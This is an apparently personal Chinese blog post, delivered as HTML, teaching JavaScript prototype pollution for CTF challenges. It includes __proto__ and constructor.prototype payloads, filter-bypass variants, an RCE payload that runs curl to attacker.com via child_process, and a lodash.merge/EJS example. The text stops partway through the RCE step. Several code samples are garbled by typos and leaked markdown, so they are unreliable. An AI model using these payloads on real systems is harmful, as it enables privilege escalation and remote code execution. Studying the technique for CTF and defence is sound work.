@@ -1,0 +1,276 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>原型链污染 | Welcome！This is Oight！</title><meta name="author" content="Oight"><meta name="copyright" content="Oight"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="原型链污染什么是原型链污染？原型链污染是一种针对JavaScript运行时的注入攻击。 在 JavaScript 中，通过修改对象的原型（prototype），让所有继承该原型的对象都“被动继承”这些修改，可能导致意外行为或安全漏洞。 通过原型链污染，攻击者可以控制对象属性的默认值，从而篡改应用程序的逻辑并可能导致服务被拒绝，甚至在某些极端情况下远程执行代码。 通俗地讲，想想你是一家车厂的老板，所">
+<meta property="og:type" content="article">
+<meta property="og:title" content="原型链污染">
+<meta property="og:url" content="http://oight.github.io/posts/bba757cf/index.html">
+<meta property="og:site_name" content="Welcome！This is Oight！">
+<meta property="og:description" content="原型链污染什么是原型链污染？原型链污染是一种针对JavaScript运行时的注入攻击。 在 JavaScript 中，通过修改对象的原型（prototype），让所有继承该原型的对象都“被动继承”这些修改，可能导致意外行为或安全漏洞。 通过原型链污染，攻击者可以控制对象属性的默认值，从而篡改应用程序的逻辑并可能导致服务被拒绝，甚至在某些极端情况下远程执行代码。 通俗地讲，想想你是一家车厂的老板，所">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://oight.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-03-05T12:37:44.000Z">
+<meta property="article:modified_time" content="2025-03-05T14:05:46.866Z">
+<meta property="article:author" content="Oight">
+<meta property="article:tag" content="周报">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://oight.github.io/img/1.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://oight.github.io/posts/bba757cf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '原型链污染',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Welcome！This is Oight！</span></a><a class="nav-page-title" href="/"><span class="site-name">原型链污染</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">原型链污染</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-05T12:37:44.000Z" title="发表于 2025-03-05 20:37:44">2025-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-05T14:05:46.866Z" title="更新于 2025-03-05 22:05:46">2025-03-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="什么是原型链污染？"><a href="#什么是原型链污染？" class="headerlink" title="什么是原型链污染？"></a>什么是原型链污染？</h2><p>原型链污染是一种针对JavaScript运行时的注入攻击。</p>
+<p>在 JavaScript 中，通过修改对象的原型（prototype），让所有继承该原型的对象都“被动继承”这些修改，可能导致意外行为或安全漏洞。</p>
+<p>通过原型链污染，攻击者可以控制对象属性的默认值，从而篡改应用程序的逻辑并可能导致服务被拒绝，甚至在某些极端情况下远程执行代码。</p>
+<p>通俗地讲，想想你是一家车厂的老板，所有汽车都按照一个 <strong>标准模板</strong> 生成，这个模板就是 __原型__。有一天，有人在模板上偷偷画了个鬼脸，结果之后生产的每辆车都带着这个鬼脸——这就是原型链污染。</p>
+<h2 id="为什么会发生原型链污染？"><a href="#为什么会发生原型链污染？" class="headerlink" title="为什么会发生原型链污染？"></a>为什么会发生原型链污染？</h2><ol>
+<li>原型链机制</li>
+</ol>
+<p>JavaScript 中对象可以继承属性和方法。为了使得在编写程序时更加简便，避免由于方法绑定到对象上在使用时多次调用，利用原型（prototype）就可以使得所有用同一类来实例化的对象可以直接拥有这个类中的所有内容，包括属性和方法。</p>
+<p>JavaScript 中的继承机制：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">funtion <span class="title class_">Father</span>() &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">funtion <span class="title class_">Son</span>() &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Son</span> = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)  </span><br><span class="line"><span class="comment">// 最后输出Name : Melania Trump</span></span><br></pre></td></tr></table></figure>
+
+<p>总结一下，对于对象 son ，在调用 son.last_name 的时候，实际上 JavaScript 引擎会进行如下操作：</p>
+<p>1.在对象 son 中寻找 last_name<br>2.如果找不到，则在<code>son.__proto__</code>中寻找 last_name<br>3.如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找 last_name<br>4.依次寻找，直到找到 null 结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是 null</p>
+<p>JavaScript 的这个查找的机制，被运用在面向对象的继承中，被称作 prototype 继承链。</p>
+<p>但是这一操作也使得一旦可以修改对象的原型，将使得所有的对象都被修改，从而导致安全隐患。  </p>
+<p>例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cat1 = &#123;&#125;; <span class="comment">// 普通对象</span></span><br><span class="line">car1.<span class="title function_">toString</span>(); <span class="comment">// 调用的时Object.prototype.toString</span></span><br></pre></td></tr></table></figure>
+
+<p>如果修改了<code>Object.orototype.toString</code>,所有对象的<code>toString</code>方法都会变。</p>
+<p>举一个实际利用中的例子  </p>
+<p>假设一个网站允许用户提交JSON数据：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&quot;isAdmin: true&quot;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">// 用户提交的数据中偷偷加了__proto__.isAdmin = true</span></span><br></pre></td></tr></table></figure>
+
+<p>此时，<code>Object.prototype.isAdmin</code>被设置为 true ，所有对象都会继承这个属性：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> normalUser = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(normalUser.<span class="property">isAdmin</span>); <span class="comment">// 输出true，(本不该有管理权限)</span></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 具体在CTF中的应用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 如何判断题目设计原型链污染？  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1.代码审计  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 对象合并操作：题目代码中出现`</span><span class="title class_">Object</span>.<span class="title function_">assign</span>()<span class="string">`、`</span>lodash.<span class="title function_">marge</span>()<span class="string">`、`</span><span class="title class_">JSON</span>.<span class="title function_">parse</span>()<span class="string">`等函数  </span></span><br><span class="line"><span class="string">- 动态属性赋值：如`</span>obj[key] = value<span class="string">`,其中`</span>key<span class="string">`或`</span>value<span class="string">`来自用户输入  </span></span><br><span class="line"><span class="string">- 原型链关键词：代码中显式使用`</span>__proto__<span class="string">`、`</span>prototype<span class="string">`、`</span>constructor<span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.黑箱测试特征</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 权限异常：普通用户突然拥有管理员权限，(如访问/admin 路由)  </span></span><br><span class="line"><span class="string">- 全局属性篡改: 所有对象自动继承某个属性(如 token 、isAdmin )</span></span><br><span class="line"><span class="string">- 行为突变： 调用默认方法(如`</span><span class="title function_">toString</span>()<span class="string">`)时返回意外结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3.验证方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交测试Payload：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="title class_">JSON</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;test&quot;</span>: <span class="number">123</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查响应：</p>
+<ul>
+<li><p>创建新对象 const obj &#x3D; {};，观察 obj.test 是否为 123。</p>
+</li>
+<li><p>若成功，说明原型链被污染。</p>
+</li>
+</ul>
+<h3 id="突破口与利用场景"><a href="#突破口与利用场景" class="headerlink" title="突破口与利用场景"></a>突破口与利用场景</h3><p>1.常见输入点：</p>
+<ul>
+<li>JSON数据提交：通过POST请求体传递恶意Payload。</li>
+<li>URL参数或查询字符串：如 ?key&#x3D;<strong>proto</strong>.isAdmin&amp;value&#x3D;true。</li>
+<li>表单字段：用户可控的表单字段名或值。</li>
+</ul>
+<p>2.敏感属性覆盖：</p>
+<ul>
+<li>权限标志：isAdmin、isVIP、role。</li>
+<li>身份凭证：token、session。</li>
+<li>函数重写：覆盖 toString()、valueOf() 等原型方法，触发逻辑漏洞。</li>
+</ul>
+<p>3.依赖库漏洞：</p>
+<ul>
+<li>Lodash（CVE-2019-10744）：旧版本的 _.defaultsDeep 未过滤 __proto__。</li>
+<li>Express.js中间件：解析请求体时未过滤特殊属性。</li>
+</ul>
+<h3 id="具体操作步骤"><a href="#具体操作步骤" class="headerlink" title="具体操作步骤"></a>具体操作步骤</h3><p>步骤一：构建Payload</p>
+<p>基础Payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过过滤的变种：</p>
+<ul>
+<li>Unicode编码：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;\u005F_proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>嵌套污染：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>步骤2：触发漏洞</p>
+<ul>
+<li>场景1：对象合并（如 Object.assign）：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端代码示例</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">data</span>);</span><br><span class="line"><span class="keyword">const</span> config = &#123; <span class="attr">theme</span>: <span class="string">&quot;light&quot;</span> &#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(config, userInput); <span class="comment">// 污染点</span></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload提交：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="title class_">JSON</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;isAdmin&quot;</span>: <span class="literal">true</span>&#125;&#125;</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 场景2：动态属性赋值：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="title class_">JavaScript</span></span><br><span class="line"><span class="comment">// 服务端代码示例</span></span><br><span class="line"><span class="keyword">const</span> key = req.<span class="property">query</span>.<span class="property">key</span>; <span class="comment">// 用户可控</span></span><br><span class="line"><span class="keyword">const</span> value = req.<span class="property">query</span>.<span class="property">value</span>;</span><br><span class="line">obj[key] = value;</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload提交：</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<p>GET &#x2F;api&#x2F;set?key&#x3D;<strong>proto</strong>.isAdmin&amp;value&#x3D;true</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">步骤3：验证污染效果</span><br><span class="line"></span><br><span class="line">- 直接检查原型属性：</span><br><span class="line"></span><br><span class="line">```JavaScript</span><br><span class="line">console.log(Object.prototype.isAdmin); // 输出应为 true</span><br></pre></td></tr></table></figure>
+
+<p>触发敏感逻辑：</p>
+<ul>
+<li><p>访问需要管理员权限的接口（如 &#x2F;admin）。</p>
+</li>
+<li><p>调用被覆盖的方法：</p>
+</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">toString</span>()); <span class="comment">// 若覆盖为恶意函数，可能触发XSS或RCE</span></span><br></pre></td></tr></table></figure>
+
+<p>步骤4：高级利用（结合其他漏洞）</p>
+<ul>
+<li>远程代码执行（RCE）：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;exec&quot;</span><span class="punctuation">:</span> <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;curl http://attacker.com&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>信息泄露：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;getSecret&quot;</span><span class="punctuation">:</span> function() <span class="punctuation">&#123;</span> return this.internalSecret; <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">四、绕过防御的技巧</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>属性名混淆：</span><br><span class="line"></span><br><span class="line">- 大小写变异：`__PROTO__`、`__proto__`。</span><br><span class="line"></span><br><span class="line">- 特殊字符插入：`__pro__to__`（部分过滤逻辑不严格）。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>多层嵌套污染：</span><br><span class="line"></span><br><span class="line">```JSON</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">某些合并函数可能递归处理嵌套对象。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>利用库函数特性：</span><br><span class="line"></span><br><span class="line">- Lodash旧版本：_.merge 默认处理 __proto__。</span><br><span class="line"></span><br><span class="line">- jQuery.extend：需测试是否深拷贝原型属性。  </span><br><span class="line"></span><br><span class="line">例题：</span><br><span class="line"></span><br><span class="line">```JSON</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    const lodash = require(&#x27;lodash&#x27;)</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    app.engine(&#x27;ejs&#x27;<span class="punctuation">,</span> function (filePath<span class="punctuation">,</span> options<span class="punctuation">,</span> callback) <span class="punctuation">&#123;</span> </span><br><span class="line">    <span class="comment">// define the template engine</span></span><br><span class="line">        fs.readFile(filePath<span class="punctuation">,</span> (err<span class="punctuation">,</span> content) =&gt; <span class="punctuation">&#123;</span></span><br><span class="line">            if (err) return callback(new Error(err))</span><br><span class="line">            let compiled = lodash.template(content)</span><br><span class="line">            let rendered = compiled(<span class="punctuation">&#123;</span>...options<span class="punctuation">&#125;</span>)</span><br><span class="line"></span><br><span class="line">            return callback(<span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> rendered)</span><br><span class="line">        <span class="punctuation">&#125;</span>)</span><br><span class="line">    <span class="punctuation">&#125;</span>)</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    app.all(&#x27;/&#x27;<span class="punctuation">,</span> (req<span class="punctuation">,</span> res) =&gt; <span class="punctuation">&#123;</span></span><br><span class="line">        let data = req.session.data || <span class="punctuation">&#123;</span>language<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span> category<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">        if (req.method == &#x27;POST&#x27;) <span class="punctuation">&#123;</span></span><br><span class="line">            data = lodash.merge(data<span class="punctuation">,</span> req.body)</span><br><span class="line">            req.session.data = data</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">        res.render(&#x27;index&#x27;<span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">            language<span class="punctuation">:</span> data.language<span class="punctuation">,</span> </span><br><span class="line">            category<span class="punctuation">:</span> data.category</span><br><span class="line">        <span class="punctuation">&#125;</span>)</span><br><span class="line">    <span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="解决步骤与原理详解"><a href="#解决步骤与原理详解" class="headerlink" title="解决步骤与原理详解"></a>解决步骤与原理详解</h3><h4 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1. 漏洞分析"></a><strong>1. 漏洞分析</strong></h4><p>题目代码中使用了存在漏洞的 <code>lodash.merge</code> 方法合并用户输入（<code>req.body</code>），且未过滤 <code>__proto__</code> 或 <code>constructor</code> 属性。旧版 Lodash（如 4.17.10 之前）的 <code>merge</code> 方法未正确处理原型链属性，导致攻击者可通过注入 <code>__proto__</code> 污染全局对象原型。</p>
+<hr>
+<h4 id="2-漏洞利用步骤"><a href="#2-漏洞利用步骤" class="headerlink" title="2. 漏洞利用步骤"></a><strong>2. 漏洞利用步骤</strong></h4><h5 id="步骤1：确认漏洞存在"><a href="#步骤1：确认漏洞存在" class="headerlink" title="步骤1：确认漏洞存在"></a><strong>步骤1：确认漏洞存在</strong></h5><ul>
+<li><strong>测试Payload</strong>：发送以下 POST 请求，尝试污染 <code>Object.prototype</code>：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;polluted&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>验证污染</strong>：在后续请求中，检查任意对象的 <code>polluted</code> 属性：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端代码示例</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>); <span class="comment">// 若输出 &quot;test&quot;，则污染成功</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="步骤2：利用污染实现RCE"><a href="#步骤2：利用污染实现RCE" class="headerlink" title="步骤2：利用污染实现RCE"></a><strong>步骤2：利用污染实现RCE</strong></h5><p>目标是通过污染原型链，在模板渲染时触发代码执行。<br><strong>EJS模板特性</strong>：EJS 在渲染时，若模板中访问了对象属性，且该属性被污染为一个函数，则会执行该函数。</p>
